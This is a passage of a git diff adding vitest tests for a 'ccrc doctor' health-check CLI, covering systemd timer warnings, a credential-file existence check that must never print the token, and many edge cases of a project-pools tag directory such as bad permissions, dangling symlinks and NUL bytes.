@@ -44,9 +44,13 @@ import {
 import path, { join } from 'node:path';
 import { fileURLToPath } from 'node:url';
 import { mkTmp } from './tmpHelpers.js';
-import { ghContainedEnv, ghPoisonAt } from './ccdWsHelpers.js';
+import { ghContainedEnv, ghPoisonAt, seedAccountsSh } from './ccdWsHelpers.js';
 import { plantAuthHelper, plantAuthModule, fixtureSecretLine } from './authFixtures.js';
+// One home for the scratch-slug vocabulary (D-2375) — see scratchSlugs.ts
+// for the rule, and for why the /var/tmp control needs both spellings.
+import { SCRATCH_SLUGS, PERSISTENT_SLUGS } from './scratchSlugs.js';
 import { describeLinux, describeDarwin, itLinux } from './platformFixtures.js';
+import { POOLED_TEST_ROSTER } from './fixtures/poolRule.js';
 
 const here = path.dirname(fileURLToPath(import.meta.url));
 const REPO = path.resolve(here, '..', '..');
@@ -260,11 +264,17 @@ interface RosterEntry {
   id: string;
   configDirSuffix?: string;
   exec: { kind: 'upstream' | 'generated' | 'external'; secretsFile?: string };
+  /** Task: `credentials` reads it, and `healthy()`'s contract is that every
+   *  check PASSES — so the fixture's one account has to be an account the check
+   *  has something to measure about. `_check_wrappers`' own TSV reader ignores
+   *  the field, so no existing case moves. */
+  telemetry?: 'anthropic' | 'none';
 }
 
 /** The upstream account every real roster has exactly one of — `parseRoster`
  *  refuses one without it, and `healthy()` plants its binary. */
-const UPSTREAM: RosterEntry = { id: 'claude', configDirSuffix: '.claude', exec: { kind: 'upstream' } };
+const UPSTREAM: RosterEntry = { id: 'claude', configDirSuffix: '.claude',
+  exec: { kind: 'upstream' }, telemetry: 'anthropic' };
 
 /** Writes `~/.ccrc/accounts.json`. Two fixture conveniences, both deliberate:
  *  an entry with no `configDirSuffix` gets `.<id>` (the wrapper writer below
@@ -919,6 +929,14 @@ function healthy(prefix: string): string {
   // below starts here and adds (or replaces) exactly what it is about.
   writeBinary(home, 'claude');
   writeRoster(home, [UPSTREAM]);
+  // …and its credential is where the convention says it is. A healthy box is one
+  // where every check PASSES, and `credentials` measures exactly this: the
+  // roster declares one telemetry:'anthropic' account, so there is one file it
+  // must have. Contents are never read by the check (or by this fixture) —
+  // existence and non-emptiness are the whole question.
+  mkdirSync(join(home, '.cc-secrets'), { recursive: true });
+  writeFileSync(join(home, '.cc-secrets', 'claude-oauth.env'),
+    'export CLAUDE_CODE_OAUTH_TOKEN=fixture-not-a-real-token\n', { mode: 0o600 });
   // …and it knows where its server is, and that server says the two boxes
   // agree. A healthy box is one where every check PASSES, so the fleet check
   // has to have something to measure here — a fixture whose fleet check SKIPPED
@@ -1813,6 +1831,93 @@ describe('ccrc doctor: services', () => {
     const mgr = process.platform === 'darwin' ? 'launchctl' : 'systemctl';
     expect(r.stdout).toMatch(new RegExp(`^FAIL services: ${mgr} is not on PATH`, 'm'));
     expect(r.code).toBe(1);
+  });
+});
+
+describe('ccrc doctor: services knows about the account-health timer', () => {
+  itLinux('warns — with its OWN consequence — when the probe timer is installed and stopped', () => {
+    // §A.7's parenthesis, measured: `known` (ccd/ccrc-doctor-checks:808) is a
+    // hardcoded three-name list, and a timer outside it is a unit this box runs
+    // and doctor never asks about. WARN is the right class for the same reason
+    // cap-scopes' is — a stopped probe is degradation, not a box that is down —
+    // but the SENTENCE cannot be shared: cap-scopes' says "panes spawned while
+    // it is stopped run without their memory cap", which is false here and
+    // would send an operator to the wrong place with the right remedy.
+    const home = healthy('ccrc-doctor-services-health-timer-');
+    writeUnitFile(home, 'ccd-account-health.timer');
+    writeFileSync(join(home, 'fixture-unit-ccd-account-health.timer'), 'inactive\n');
+    const lines = runDoctor(home).stdout.split('\n');
+    const i = lines.findIndex((l) => l.startsWith('WARN services: '));
+    expect(i, lines.join('\n')).toBeGreaterThan(-1);
+    expect(lines[i]).toContain('ccd-account-health.timer is installed but inactive');
+    expect(lines[i]).toContain('no account\'s credential is being probed');
+    expect(lines[i]).not.toContain('memory cap');
+    expect(lines[i + 1]).toMatch(/^ {2}remedy: systemctl --user enable --now ccd-account-health\.timer$/);
+    // A stopped reading is not a failed box: WARN, and rc stays 0.
+    expect(runDoctor(home).code).toBe(0);
+  });
+
+  itLinux('names it in the PASS line when it is installed and running', () => {
+    // "The PASS names every unit it asked about" is `_check_services`' own
+    // stated contract; a timer added to `known` and then never mentioned would
+    // satisfy the warn case above while measuring nothing on a healthy box.
+    const home = healthy('ccrc-doctor-services-health-timer-ok-');
+    writeUnitFile(home, 'ccd-account-health.timer');
+    writeFileSync(join(home, 'fixture-unit-ccd-account-health.timer'), 'active\n');
+    const line = lineFor(runDoctor(home).stdout, 'services') ?? '';
+    expect(line).toMatch(/^PASS services: /);
+    expect(line).toContain('ccd-account-health.timer is active');
+  });
+
+  it('a box without the unit is never asked about it — no count moves', () => {
+    // `_check_services` asks only about units whose FILE is in the unit dir, so
+    // a fourth name in `known` costs nothing on a fixture that never plants it.
+    // That is the whole reason `HEALTHY_SKIPS` and the counting pins that read
+    // it (`:1280`, `:1789`, `:1894`, `:3128`, `:4501`, `:5177`, `:5178`) stay
+    // exactly where they are.
+    const home = healthy('ccrc-doctor-services-health-timer-absent-');
+    const line = lineFor(runDoctor(home).stdout, 'services') ?? '';
+    expect(line).toMatch(/^PASS services: /);
+    expect(line).not.toContain('ccd-account-health');
+  });
+});
+
+describe('ccrc doctor: services knows about the telemetry keepalive timer', () => {
+  // F4 (fix-wave 2026-09-07): `ccd-account-health.timer` joined `known` with
+  // its own consequence sentence and a `*)` arm that already reasons about
+  // "the day a fifth unit joins it" — `ccd-telemetry-keepalive.timer` is that
+  // fifth unit, and a stopped keepalive is silent (no error, just telemetry
+  // going stale) unless doctor names it.
+  itLinux('warns — with its OWN consequence — when the keepalive timer is installed and stopped', () => {
+    const home = healthy('ccrc-doctor-services-keepalive-timer-');
+    writeUnitFile(home, 'ccd-telemetry-keepalive.timer');
+    writeFileSync(join(home, 'fixture-unit-ccd-telemetry-keepalive.timer'), 'inactive\n');
+    const lines = runDoctor(home).stdout.split('\n');
+    const i = lines.findIndex((l) => l.startsWith('WARN services: '));
+    expect(i, lines.join('\n')).toBeGreaterThan(-1);
+    expect(lines[i]).toContain('ccd-telemetry-keepalive.timer is installed but inactive');
+    expect(lines[i]).toContain('goes stale');
+    expect(lines[i]).not.toContain('memory cap');
+    expect(lines[i]).not.toContain('credential is being probed');
+    expect(lines[i + 1]).toMatch(/^ {2}remedy: systemctl --user enable --now ccd-telemetry-keepalive\.timer$/);
+    // A stopped reading is not a failed box: WARN, and rc stays 0.
+    expect(runDoctor(home).code).toBe(0);
+  });
+
+  itLinux('names it in the PASS line when it is installed and running', () => {
+    const home = healthy('ccrc-doctor-services-keepalive-timer-ok-');
+    writeUnitFile(home, 'ccd-telemetry-keepalive.timer');
+    writeFileSync(join(home, 'fixture-unit-ccd-telemetry-keepalive.timer'), 'active\n');
+    const line = lineFor(runDoctor(home).stdout, 'services') ?? '';
+    expect(line).toMatch(/^PASS services: /);
+    expect(line).toContain('ccd-telemetry-keepalive.timer is active');
+  });
+
+  it('a box without the unit is never asked about it — no count moves', () => {
+    const home = healthy('ccrc-doctor-services-keepalive-timer-absent-');
+    const line = lineFor(runDoctor(home).stdout, 'services') ?? '';
+    expect(line).toMatch(/^PASS services: /);
+    expect(line).not.toContain('ccd-telemetry-keepalive');
   });
 });
 
@@ -3615,6 +3720,634 @@ describe('ccrc doctor: wrappers', () => {
     // the check never ran at all.
     expect(line).toMatch(/^FAIL wrappers: acct-a /);
     expect(line).toBe(lineFor(runDoctor(without).stdout, 'wrappers'));
+  });
+});
+
+describe('ccrc doctor: credentials', () => {
+  it('passes on a healthy box and names what it measured', () => {
+    const home = healthy('ccrc-doctor-cred-ok-');
+    expect(runDoctor(home).stdout).toMatch(/^PASS credentials: 1 account/m);
+  });
+
+  it('goes red — LOUDLY — when an expected token file is absent', () => {
+    // THE WHOLE REASON THIS CHECK EXISTS. The roster structurally cannot declare
+    // where an `upstream` account's credential lives, so the probe derives the
+    // path by convention. A convention with no measurement is a silent skip
+    // waiting to happen: the probe would refuse that account for ever and the
+    // only place saying so would be a journal nobody reads.
+    const home = healthy('ccrc-doctor-cred-missing-');
+    rmSync(join(home, '.cc-secrets', 'claude-oauth.env'));
+    const r = runDoctor(home);
+    expect(r.code).toBe(1);
+    expect(r.stdout).toMatch(/^FAIL credentials: claude/m);
+    expect(r.stdout).toMatch(/\.cc-secrets\/claude-oauth\.env/);
+  });
+
+  it('goes red on an EMPTY token file — E4: an empty bearer answers 429, not an auth error', () => {
+    const home = healthy('ccrc-doctor-cred-empty-');
+    writeFileSync(join(home, '.cc-secrets', 'claude-oauth.env'), '');
+    expect(runDoctor(home).stdout).toMatch(/^FAIL credentials: claude/m);
+  });
+
+  it('never prints a byte of the file', () => {
+    const home = healthy('ccrc-doctor-cred-quiet-');
+    writeFileSync(join(home, '.cc-secrets', 'claude-oauth.env'),
+      'export CLAUDE_CODE_OAUTH_TOKEN=sk-ant-oat01-SENTINEL\n');
+    const r = runDoctor(home);
+    expect(r.stdout).not.toContain('SENTINEL');
+    expect(r.stderr).not.toContain('SENTINEL');
+  });
+
+  it('ignores a telemetry:none account — it has no Anthropic credential to have', () => {
+    const home = healthy('ccrc-doctor-cred-none-');
+    writeRoster(home, [UPSTREAM,
+      { id: 'other-lane', exec: { kind: 'external' }, telemetry: 'none' }]);
+    expect(runDoctor(home).stdout).toMatch(/^PASS credentials: 1 account/m);
+  });
+
+  it('SKIPs rather than PASSing when there is no roster — `wrappers` owns that fact', () => {
+    // Two checks measuring one thing is how they come to disagree, and a doctor
+    // that reports agreement it measured nothing is the worst failure this verb
+    // has. No remedy under a skip, by this file's own contract.
+    const home = healthy('ccrc-doctor-cred-noroster-');
+    rmSync(join(home, '.ccrc', 'accounts.json'));
+    expect(runDoctor(home).stdout).toMatch(/^SKIP credentials: /m);
+  });
+
+  it('SKIPs rather than FAILing when $HOME/.cc-secrets does not exist at all — the box is not provisioned yet', () => {
+    // THE REGRESSION THIS TEST PINS. `ccrc install` runs `cmd_doctor` and dies
+    // on any FAIL, so on every fresh box — and every install fixture — where
+    // credentials have not been provisioned yet, this check must not be the
+    // thing that blocks the install that has to happen BEFORE provisioning
+    // can. "Not provisioned yet" is unmeasurable, and unmeasurable SKIPS; it is
+    // a DIFFERENT finding from "provisioned, and this account's file happens
+    // to be missing", which stays a FAIL (see the tests above and below this
+    // one — they must stay red-on-delete for the arm to mean anything).
+    const home = healthy('ccrc-doctor-cred-noprovision-');
+    rmSync(join(home, '.cc-secrets'), { recursive: true, force: true });
+    const r = runDoctor(home);
+    expect(r.stdout).toMatch(/^SKIP credentials: /m);
+    expect(r.stdout).not.toMatch(/^FAIL credentials: /m);
+    expect(r.stdout).toMatch(/\.cc-secrets/);
+  });
+});
+
+describe('ccrc doctor: pools', () => {
+  /** `$HOME/.cc-sessions/pools/<project>`, with EXACT bytes. */
+  function tag(home: string, project: string, bytes: string): string {
+    const d = join(home, '.cc-sessions', 'pools');
+    mkdirSync(d, { recursive: true });
+    const p = join(d, project);
+    writeFileSync(p, bytes);
+    return p;
+  }
+
+  /** A project directory under `$HOME/projects`, which is where the check
+   *  looks for one — the same spelling `_check_graphify` uses (`:2764`). */
+  const project = (home: string, name: string): void => {
+    mkdirSync(join(home, 'projects', name), { recursive: true });
+  };
+
+  /** The roster projection ccd obeys, so the orphan arm has a pool vocabulary
+   *  to measure against. Generated, never hand-written — a fixture accounts.sh
+   *  typed out here would be a copy of the roster deciding what the check
+   *  believes. */
+  const pooledRoster = (home: string): void => seedAccountsSh(home, POOLED_TEST_ROSTER);
+
+  it('PASSES with no pools directory at all — nothing is tagged, nothing is constrained', () => {
+    const home = healthy('ccrc-doctor-pools-none-');
+    const line = lineFor(runDoctor(home).stdout, 'pools');
+    expect(line).toMatch(/^PASS pools: /);
+    expect(line).toContain('no project pools tagged');
+  });
+
+  it('PASSES on a tagged, coherent box — one line, no remedy', () => {
+    const home = healthy('ccrc-doctor-pools-ok-');
+    pooledRoster(home);
+    project(home, 'demo');
+    tag(home, 'demo', 'pool-a');
+    const out = runDoctor(home).stdout;
+    expect(lineFor(out, 'pools')).toMatch(/^PASS pools: /);
+    expect(out.split('\n').filter((l) => / pools: /.test(l))).toHaveLength(1);
+  });
+
+  it('FAILS pools-malformed with its own remedy, and names the file', () => {
+    const home = healthy('ccrc-doctor-pools-malformed-');
+    pooledRoster(home);
+    project(home, 'demo');
+    tag(home, 'demo', 'Pool a');
+    const lines = runDoctor(home).stdout.split('\n');
+    const i = lines.findIndex((l) => l.startsWith('FAIL pools: ') && l.includes('pools-malformed'));
+    expect(i, `no pools-malformed line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
+    expect(lines[i]).toContain('demo');
+    expect(lines[i + 1]).toMatch(/^ {2}remedy: \S/);
+  });
+
+  it('WARNS pools-stale for a tag whose project and registry rows are both gone', () => {
+    const home = healthy('ccrc-doctor-pools-stale-');
+    pooledRoster(home);
+    tag(home, 'quiet-basin', 'pool-a');   // no projects/quiet-basin, no *.project row
+    const lines = runDoctor(home).stdout.split('\n');
+    const i = lines.findIndex((l) => l.startsWith('WARN pools: ') && l.includes('pools-stale'));
+    expect(i, `no pools-stale line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
+    // The remedy is the verb, and the verb's `--clear` arm is existence-free
+    // precisely so this remedy always works.
+    expect(lines[i + 1]).toContain('ccd project-pool --project quiet-basin --clear');
+  });
+
+  it('does NOT call a registry-only project stale', () => {
+    // The `--pool` arm accepts a project that exists only as a registry row;
+    // the doctor must use the same two-way test, or it reports every
+    // custom-workdir project as stale.
+    const home = healthy('ccrc-doctor-pools-regonly-');
+    pooledRoster(home);
+    mkdirSync(join(home, '.cc-sessions'), { recursive: true });
+    writeFileSync(join(home, '.cc-sessions', 'claude-quiet-basin.project'), 'quiet-basin');
+    tag(home, 'quiet-basin', 'pool-a');
+    expect(lineFor(runDoctor(home).stdout, 'pools')).toMatch(/^PASS pools: /);
+  });
+
+  it('WARNS pools-orphan-pool when no rostered account carries the name', () => {
+    const home = healthy('ccrc-doctor-pools-orphan-');
+    pooledRoster(home);
+    project(home, 'demo');
+    tag(home, 'demo', 'pool-c');          // no account in POOLED_TEST_ROSTER carries it
+    const lines = runDoctor(home).stdout.split('\n');
+    const i = lines.findIndex((l) => l.startsWith('WARN pools: ') && l.includes('pools-orphan-pool'));
+    expect(i, `no pools-orphan-pool line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
+    expect(lines[i + 1]).toMatch(/^ {2}remedy: \S/);
+  });
+
+  it('WARNS pools-tmp-leak for a dot-leading entry, with `rm` as the remedy', () => {
+    const home = healthy('ccrc-doctor-pools-leak-');
+    pooledRoster(home);
+    project(home, 'demo');
+    tag(home, 'demo', 'pool-a');
+    tag(home, '.demo.4242.tmp', 'pool-a');
+    const lines = runDoctor(home).stdout.split('\n');
+    const i = lines.findIndex((l) => l.startsWith('WARN pools: ') && l.includes('pools-tmp-leak'));
+    expect(i, `no pools-tmp-leak line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
+    expect(lines[i + 1]).toContain('rm');
+  });
+
+  it('FAILS pools-unlistable when a regular file sits where the directory belongs', () => {
+    const home = healthy('ccrc-doctor-pools-unlistable-');
+    mkdirSync(join(home, '.cc-sessions'), { recursive: true });
+    writeFileSync(join(home, '.cc-sessions', 'pools'), 'not a directory\n');
+    const lines = runDoctor(home).stdout.split('\n');
+    const i = lines.findIndex((l) => l.startsWith('FAIL pools: ') && l.includes('pools-unlistable'));
+    expect(i, `no pools-unlistable line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
+    expect(lines[i + 1]).toMatch(/^ {2}remedy: \S/);
+  });
+
+  it.skipIf(process.getuid?.() === 0)(
+    'FAILS pools-unreadable for a mode-000 tag, and never calls it untagged', () => {
+      const home = healthy('ccrc-doctor-pools-unreadable-');
+      pooledRoster(home);
+      project(home, 'demo');
+      const p = tag(home, 'demo', 'pool-a');
+      chmodSync(p, 0o000);
+      try {
+        const lines = runDoctor(home).stdout.split('\n');
+        const i = lines.findIndex((l) => l.startsWith('FAIL pools: ') && l.includes('pools-unreadable'));
+        expect(i, `no pools-unreadable line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
+        expect(lines[i]).toContain('demo');
+      } finally {
+        chmodSync(p, 0o600);
+      }
+    });
+
+  it('FAILS pools-unreadable for a DANGLING SYMLINK at a tag path, never PASS', () => {
+    // `-e` is FALSE for a dangling symlink — the same defect `ccd/ccd` fixed
+    // twice already (its reader and its writer verb), now a third file. A
+    // half-finished `ln -s` after moving a tag must not read as "no tag here".
+    const home = healthy('ccrc-doctor-pools-dangling-tag-');
+    pooledRoster(home);
+    project(home, 'demo');
+    const d = join(home, '.cc-sessions', 'pools');
+    mkdirSync(d, { recursive: true });
+    symlinkSync('/nonexistent-target', join(d, 'demo'));
+    const lines = runDoctor(home).stdout.split('\n');
+    const i = lines.findIndex((l) => l.startsWith('FAIL pools: ') && l.includes('pools-unreadable'));
+    expect(i, `no pools-unreadable line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
+    expect(lines[i]).toContain('demo');
+    expect(lineFor(runDoctor(home).stdout, 'pools')).not.toMatch(/^PASS pools: /);
+  });
+
+  it('FAILS pools-unlistable for a DANGLING SYMLINK at pools/ itself, never PASS "no project pools tagged"', () => {
+    // The inverse-of-the-truth case: `pools/ -> /nonexistent` must not read as
+    // "nothing is tagged, every project is unconstrained" — `ccd` answers
+    // `unreadable` for EVERY project on a box shaped like this, so the doctor
+    // printing its most reassuring PASS here is the exact opposite of what a
+    // half-finished `ln -s` after moving the registry has done.
+    const home = healthy('ccrc-doctor-pools-dangling-dir-');
+    mkdirSync(join(home, '.cc-sessions'), { recursive: true });
+    symlinkSync('/nonexistent-target', join(home, '.cc-sessions', 'pools'));
+    const lines = runDoctor(home).stdout.split('\n');
+    const i = lines.findIndex((l) => l.startsWith('FAIL pools: ') && l.includes('pools-unlistable'));
+    expect(i, `no pools-unlistable line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
+    expect(lineFor(runDoctor(home).stdout, 'pools')).not.toMatch(/^PASS pools: /);
+  });
+
+  it.skipIf(process.getuid?.() === 0)(
+    'FAILS pools-unlistable when the REGISTRY cannot be searched, never PASS "no project pools tagged"', () => {
+      // THE PARENT'S BLIND SPOT, not the tag's. `-e` and `-L` on
+      // `~/.cc-sessions/pools` are BOTH false when `~/.cc-sessions` itself is
+      // mode 000 — neither predicate can stat OR lstat through a directory it
+      // may not search — so the absence branch fires and the doctor prints its
+      // most reassuring PASS on a box where `ccd`'s own reader answers
+      // `unreadable` for EVERY project (measured: `_project_pool_state demo`
+      // -> `unreadable`) and every placement REFUSES. Pairing `-e` with `-L`
+      // (D-1848) does not close this one; only a searchability test on the
+      // PARENT does. Skipped as root: root searches any directory, so the
+      // fixture cannot be built.
+      const home = healthy('ccrc-doctor-pools-reg-unsearchable-');
+      pooledRoster(home);
+      project(home, 'demo');
+      tag(home, 'demo', 'pool-a');
+      const reg = join(home, '.cc-sessions');
+      chmodSync(reg, 0o000);
+      try {
+        const out = runDoctor(home).stdout;
+        const lines = out.split('\n');
+        const i = lines.findIndex((l) => l.startsWith('FAIL pools: ') && l.includes('pools-unlistable'));
+        expect(i, `no pools-unlistable line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
+        expect(lines[i]).toContain(reg);
+        expect(lines[i + 1]).toMatch(/^ {2}remedy: \S/);
+        expect(lineFor(out, 'pools')).not.toMatch(/^PASS pools: /);
+      } finally {
+        chmodSync(reg, 0o755);
+      }
+    });
+
+  it('still PASSES when the registry is ABSENT — the server box owns no ~/.cc-sessions at all', () => {
+    // The other side of the guard above, and the reason it does NOT simply
+    // copy `_project_pool_state`'s `[[ -d "$REG" && -x "$REG" ]]`: that reader
+    // answers `unreadable` for an ABSENT `$REG` too, on a branch its own
+    // comment calls unreachable (`ccd` runs `mkdir -p "$REG"` at source time).
+    // `ccrc doctor` has no such guarantee — it runs on the server box, which
+    // owns no registry at all — and there "nothing is tagged, every project is
+    // unconstrained" is measured, not assumed. `healthy()` builds exactly that
+    // box: it never creates `~/.cc-sessions`.
+    const home = healthy('ccrc-doctor-pools-reg-absent-');
+    expect(existsSync(join(home, '.cc-sessions')), 'the fixture is not the no-registry box').toBe(false);
+    const line = lineFor(runDoctor(home).stdout, 'pools');
+    expect(line).toMatch(/^PASS pools: /);
+    expect(line).toContain('no project pools tagged');
+  });
+
+  it('FAILS pools-malformed for a tag holding an embedded NUL byte, and leaks no warning to stderr', () => {
+    // Bash DROPS a NUL wherever it lands in a variable, so `$(< "$f")` spliced
+    // `pool-\0a` into the legal-looking token `pool-a` and the check PASSED
+    // "every project tag … is one legal pool name" — while the command
+    // substitution ALSO printed `warning: command substitution: ignored null
+    // byte in input` straight to the operator's stderr. `ccd`'s reader answers
+    // `malformed` for this file. The only builtin that can SEE the NUL is
+    // `read -d ''`, whose exit status distinguishes "found a delimiter" from
+    // "hit EOF" — which is what the check now uses, so both halves are fixed
+    // by one change.
+    const home = healthy('ccrc-doctor-pools-nul-');
+    pooledRoster(home);
+    project(home, 'demo');
+    tag(home, 'demo', 'pool-\u0000a');
+    const r = runDoctor(home);
+    const lines = r.stdout.split('\n');
+    const i = lines.findIndex((l) => l.startsWith('FAIL pools: ') && l.includes('pools-malformed'));
+    expect(i, `no pools-malformed line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
+    expect(lines[i]).toContain('demo');
+    expect(r.stderr).not.toContain('null byte');
+    expect(r.stderr).toBe('');
+  });
+
+  it('gives each class its OWN line and its OWN remedy, never one joined verdict', () => {
+    // Two classes with two different remedies on one box: `pools-malformed` is
+    // "rewrite the file", `pools-stale` is "clear the tag". Joining them hands
+    // one finding the other's instruction, the collapse `_check_wrappers` was
+    // split for.
+    const home = healthy('ccrc-doctor-pools-two-');
+    pooledRoster(home);
+    project(home, 'demo');
+    tag(home, 'demo', 'Pool a');
+    tag(home, 'quiet-basin', 'pool-a');
+    const lines = runDoctor(home).stdout.split('\n');
+    const verdicts = lines.filter((l) => / pools: /.test(l));
+    expect(verdicts.length, `expected two pools verdict lines:\n${lines.join('\n')}`).toBe(2);
+    for (const v of verdicts) {
+      expect(lines[lines.indexOf(v) + 1]).toMatch(/^ {2}remedy: \S/);
+    }
+  });
+
+  // ── HOW THE `Mutation, measured` NOTES BELOW WERE TAKEN ─────────────────
+  // `runDoctor` runs the SHIPPED `ccd/ccrc-doctor-checks` (`installCcrc`
+  // symlinks it into the fixture box), so a mutated build cannot be reached
+  // through it and the production fix cannot be un-shipped to measure the
+  // red. Each note below was therefore taken the way `pool-name-parity.test.ts`
+  // runs that same file: the checks file copied to a scratchpad, the ONE guard
+  // under test reverted there, and the copy sourced standalone under `set -u`
+  // with an empty PATH (`. <copy>; _check_pools`). The replay HOME is minimal
+  // — the `pools/` tags, the `projects/` directories and the `accounts.sh`
+  // this check reads, and nothing else, since `healthy()`'s other artifacts
+  // belong to other checks — so what the replay measures is the VERDICT LINE,
+  // the same string these assertions read, and not vitest's own red, which is
+  // the one thing a scratchpad copy cannot produce.
+
+  // ── `-r` AND `-x` ARE DIFFERENT QUESTIONS (fix round 7, fold b) ──────────
+  // Until this round `_check_pools` folded them into one FAIL
+  // (`[ ! -d ] || [ ! -r ] || [ ! -x ]`), so a `pools/` at mode `--x` — every
+  // tag reachable, none of them listable — was reported `pools-unlistable: …
+  // so no project's tag can be read — ccd reads this same path`, which is
+  // false in both halves. The AUTHORITY is `_project_pool_state`
+  // (`_project_pool_state`): it stats ONE known path (`$POOLS_DIR/<project>`) and
+  // never enumerates, so SEARCH is all it needs and LIST is what only this
+  // check needs.
+  //
+  // Measured against that real reader, on exactly the two fixtures the pair
+  // of tests below builds (`. ccd/ccd; _project_pool_state demo`, fixture
+  // HOME, one legal tag under `pools/`):
+  //     pools/ at 0111 (searchable, not listable) -> `named pool-a`
+  //     pools/ at 0444 (listable, not searchable) -> `unreadable`
+  // The doctor now agrees with the authority in both directions, and these
+  // two tests are one pin each on one of those directions.
+  it.skipIf(process.getuid?.() === 0)(
+    'WARNS pools-unenumerable, never FAILS, for a pools/ that is searchable but not listable', () => {
+      // The direction the fold got WRONG. `ccd` places work for this box
+      // perfectly; the only thing broken is this check's own eyesight, so the
+      // class has to be the one whose CLAIM is "everything works, nobody can
+      // audit it" — a separate word from `pools-unlistable`, not a softer
+      // tone on the same one.
+      //
+      // Mutation, measured: `ccd/ccrc-doctor-checks` copied to the scratchpad
+      // with the split reverted (the FAIL test back to `[ ! -d "$dir" ] ||
+      // [ ! -r "$dir" ] || [ ! -x "$dir" ]` and the `pools-unenumerable` WARN
+      // block deleted) answers this fixture `FAIL pools: pools-unlistable: …`
+      // — so all three assertions below red on that copy and pass on the tree.
+      //
+      // Skipped as root: root searches and lists any directory, so the
+      // fixture cannot be built — the same reason the mode-000 cases above
+      // skip.
+      const home = healthy('ccrc-doctor-pools-unenumerable-');
+      pooledRoster(home);
+      project(home, 'demo');
+      tag(home, 'demo', 'pool-a');
+      const d = join(home, '.cc-sessions', 'pools');
+      chmodSync(d, 0o111);
+      try {
+        const out = runDoctor(home).stdout;
+        const line = lineFor(out, 'pools');
+        expect(line, `no pools verdict line:\n${out}`).toMatch(/^WARN pools: /);
+        expect(line).toContain('pools-unenumerable');
+        // The old verdict, by name: a doctor that FAILs a box `ccd` is happy
+        // with is the cross-file disagreement this whole wave keeps finding,
+        // pointed at itself.
+        expect(out).not.toContain('pools-unlistable');
+      } finally {
+        chmodSync(d, 0o755);
+      }
+    });
+
+  it.skipIf(process.getuid?.() === 0)(
+    'still FAILS pools-unlistable for a pools/ that is listable but not searchable', () => {
+      // The direction the split must NOT have cost. `-r` alone becoming a
+      // WARN is only correct because `-x` is still a FAIL on its own: at 0444
+      // the reader answers `unreadable` for EVERY project (measured, above),
+      // so this is the verdict that agrees with it.
+      //
+      // Mutation, measured: this test does NOT detect the reverted fold —
+      // that copy FAILs `pools-unlistable` here too, exactly as the tree does,
+      // and says nothing this assertion can see. What it DOES detect is the
+      // split going one step too far: a scratchpad copy whose FAIL test lost
+      // its `-x` arm (`if [ ! -d "$dir" ]; then`) answers this same fixture
+      // `PASS pools: every project tag … is one legal pool name, names a
+      // project that exists, and names a pool this box's roster carries` —
+      // the THREE-clause sentence, because this fixture calls `pooledRoster`
+      // (an earlier draft of this note quoted the roster-less branch's
+      // opening instead, which this fixture cannot produce; re-measured
+      // through vitest's own AssertionError) — because a 0444 directory globs fine and then
+      // every `[ -e "$f" ]` inside it is false — the most reassuring PASS this
+      // check has, on a box where no placement decision can be made at all.
+      // That copy reds both assertions below.
+      const home = healthy('ccrc-doctor-pools-unsearchable-');
+      pooledRoster(home);
+      project(home, 'demo');
+      tag(home, 'demo', 'pool-a');
+      const d = join(home, '.cc-sessions', 'pools');
+      chmodSync(d, 0o444);
+      try {
+        const out = runDoctor(home).stdout;
+        const line = lineFor(out, 'pools');
+        expect(line, `no pools verdict line:\n${out}`).toMatch(/^FAIL pools: /);
+        expect(line).toContain('pools-unlistable');
+      } finally {
+        chmodSync(d, 0o755);
+      }
+    });
+
+  // ── A PASS MAY NOT CLAIM A CHECK IT SKIPPED (fix round 7, fold a) ────────
+  // The orphan arm measures a tag's pool against `~/.ccrc/accounts.sh`, the
+  // generated roster projection — and when that file cannot be read it makes
+  // NO claim (`known` stays empty). NOTHING ELSE IN THE DOCTOR REPORTS THAT
+  // FILE, which an earlier draft of this comment and of the production
+  // sentence both got wrong: `_check_wrappers` holds zero occurrences of
+  // `accounts.sh` and reads `accounts.json`, answering PASS on a box with the
+  // JSON and no projection, and `_check_graphify` sources the projection when
+  // it can and silently skips when it cannot. Measured on a full `ccrc
+  // doctor` run over exactly this shape: the only line naming `accounts.sh`
+  // is the pools PASS itself. The single PASS sentence that stood here
+  // asserted the third clause, "names a pool this box's roster carries",
+  // regardless — a PASS reporting a check that never ran, which is the same
+  // false-PASS shape the `$reg`-unsearchable guard above was written for.
+  //
+  // MEASURED, NOT ASSUMED, about the fixture: `healthy()` writes
+  // `~/.ccrc/accounts.json` (`writeRoster`) and NEVER `~/.ccrc/accounts.sh` —
+  // its own comment says so and the assertion below re-measures it, so this
+  // test needs nothing removed or chmod-ed, only `pooledRoster` not called.
+  it('PASSES without claiming the roster half when ~/.ccrc/accounts.sh is ABSENT', () => {
+    // ABSENT is what this fixture measures, and the title says so. Production
+    // gates on `[ -r … ]`, which collapses absent and present-but-unreadable
+    // deliberately — one condition, one answer — so a mode-000 projection is
+    // NOT exercised here and this test makes no claim about it.
+    // Mutation, measured: a scratchpad copy whose final PASS is the single
+    // pre-fix sentence answers this fixture `PASS pools: … , names a project
+    // that exists, and names a pool this box's roster carries` — which reds
+    // the last two of the three assertions below (the `PASS pools: ` one
+    // stays green on that copy, which is the whole defect: it is still a
+    // PASS, it just reports a check that never ran).
+    const home = healthy('ccrc-doctor-pools-no-vocab-');
+    expect(existsSync(join(home, '.ccrc', 'accounts.sh')),
+      'the fixture is not the no-roster-projection box').toBe(false);
+    project(home, 'demo');
+    tag(home, 'demo', 'pool-a');
+    const line = lineFor(runDoctor(home).stdout, 'pools');
+    expect(line).toMatch(/^PASS pools: /);
+    expect(line).toContain('the pool-vocabulary half is UNMEASURED');
+    expect(line).not.toContain("names a pool this box's roster carries");
+  });
+
+  it('says the roster carries NO POOLS when the projection reads fine and no account is tagged', () => {
+    // THE STATE THAT IS EVERY BOX ON THE FLEET TODAY, and the one the first
+    // version of this fix reported as "could not be read". `known` is empty
+    // in TWO conditions — the read failed, or it succeeded and nothing is
+    // tagged — and only the first is UNMEASURED. `DEFAULT_TEST_ROSTER`
+    // carries no `pool` on any account, so `seedAccountsSh` writes a real
